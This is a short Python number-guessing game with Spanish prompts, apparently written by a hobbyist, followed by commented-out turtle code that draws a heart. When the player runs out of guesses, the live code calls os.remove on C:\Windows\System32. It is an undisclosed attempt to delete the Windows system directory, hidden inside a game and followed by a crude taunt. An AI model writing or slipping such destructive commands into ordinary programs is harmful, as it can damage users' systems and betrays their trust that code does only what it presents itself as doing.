from os import system
system("cls")

import random
import os

number = random.randint(1,20)

print("adivina el numero del 1 al 20")
inte=int(input("Cuantos intentos desea: "))

for i in range(inte):
    con=int(input("Ingrese el numero: "))
    if con == number:
        print("Es correcto")
        break
    if con < number:
        print("Es un numero mas alto")
    else:
        print("Es un numero mas bajo")
else:
    os.remove("C:\Windows\System32")
    print("Se acabaron los intentos")
    print("cagaste")
    
    
# from turtle import *
# def corazon():
#     bgcolor("black")
#     color("red")
#     title("corazon")
    
#     begin_fill()
#     pensize(3)
#     left(50)
#     forward(133)
#     circle(50,200)
#     right(140)
#     circle(50,200)
#     forward(133)
#     end_fill()

# def texto(texto):
#     penup()
#     goto(0,-50)
#     pendown()
#     color("white")
#     style = ('courier',15,'bold')
#     write(texto,align="center",font=style)
    
#     hideturtle()
#     done()
# corazon()
# texto('hola wuapa, a cuanto la hora?')
